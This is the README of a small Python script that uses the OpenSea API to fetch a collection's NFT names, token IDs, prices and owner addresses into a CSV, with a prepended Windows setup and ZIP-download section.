> [!TIP] 
> # How to run
> 
> ## Install Python
> 
> 1. Go to the official Python website: https://www.python.org/downloads/release/python-3139/
> 2. Scroll down to the files part. Then download the Windows installer (64-bit)
> 3. Once downloaded, run the installer.
> 4. ✅ Important: On the first screen of the installer, check the box that says
> “Add Python to PATH” before clicking Install Now.
> ## How to download the repo
> Click the button below to download the code as a .zip:
>
> <a href="https://github.com/moonshinesummer/nft-scraper/archive/refs/heads/main.zip"><img src="https://img.shields.io/badge/⬇️_Download_ZIP-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download ZIP"></a>
>
> 
> Now extract the .zip folder
> 
> ## Run the script
> 
> Open the command prompt inside the extracted folder and run:
>
> `py nft_scraper.py`
> 
>  or
> 
> `python nft_scraper.py`


# NFT Scraper

This is a simple NFT scraper script in Python designed to retrieve NFT data from OpenSea (or other similar APIs). This tool fetches information about NFTs from a specified collection, including their name, token ID, price in ETH, and owner's wallet address, and saves this data to a CSV file.

## Requirements

- Python 3.x
- `requests` library

## Setup

1. **Install required libraries**

   Install the necessary Python libraries by running:
   pip install requests

2. **Get an OpenSea API Key**

   To use the OpenSea API, you may need an API key. [Sign up](https://opensea.io/) and apply for an API key if necessary.

3. **Modify the Parameters**

   In the script, change the `collection` parameter under `PARAMS` to the slug of the desired collection. You can find this slug in the OpenSea collection URL (e.g., `https://opensea.io/collection/doodles-official` has the slug `doodles-official`).

4. **Add Your API Key**

   Replace "YOUR_API_KEY" in the `HEADERS` dictionary with your OpenSea API key.

## Usage

Run the script using:

py nft_scraper.py

The script fetches NFT data and saves it to a CSV file named `nft_data.csv` in the same directory.

nt